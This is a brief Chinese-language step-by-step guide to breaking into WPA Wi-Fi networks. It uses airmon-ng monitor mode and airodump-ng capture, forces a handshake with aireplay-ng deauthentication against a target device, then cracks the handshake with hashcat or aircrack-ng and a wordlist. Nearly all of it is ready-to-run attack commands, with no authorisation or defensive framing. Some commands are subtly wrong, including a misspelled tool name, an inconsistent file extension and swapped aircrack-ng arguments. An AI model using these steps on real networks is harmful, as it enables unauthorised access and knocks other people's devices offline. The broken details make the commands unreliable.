
1. 查看網絡設備, 獲取無線網卡名稱.
```bash
iwconfig
```

2. 開啓無線網卡監聽模式.
```bash
sudo airmon-ng start wlan0
```
開啓監聽模式後, 無線網卡名稱發生改變.  後面會附加`mon`(monitor), 即`wlan0mon`.

3. 監聽 Wifi 信號.
```bash
sudo airodunp-ng wlan0mon
```
當發現目標 Wifi 時按`Ctrl+C`停止掃描. 並記錄 BSSID 和 CH 兩個參數.

4. 捕獲指定 Wifi 通信內容.
```bash
sudo airodump-ng -w [.cap存檔名稱] -c [CH] --bssid [BSSID] wlan0mon
```

5. 斷開指定設備與指定 Wifi 的鏈接.
```bash
sudo aireplay-ng -0 5 -a [BSSID] -c [Target MAC] wlan0mon
```
目標設備從指定 Wifi 斷開鏈接後將嘗試衝連, 會向路由器發送握手包. 而第4步將會捕獲這個握手包.

6. 當第4步提示捕獲握手包時按下`Ctrl+C`結束監聽.
此時, 握手包的數據已經被記錄在第4步指定的`.cap`文件中.

7. 對`.cap`文件中握手包的hash進行破解.
  - 使用 Hashcat. (推薦)
    ```bash
    aircrack-ng [.cap存檔文件] -j [.haccpx文件]   # 將 .cap 文件轉爲 hashcat 接受的 .haccpx 文件
    hashcat -m 2500 -a 0 [.hccapx文件] [字典文件] # 利用 hashcat 進行破解
    ```
  - 使用 aircrack-ng.
    ```bash
    aircrack-ng -w [.cap存檔文件] [字典文件]
    ```

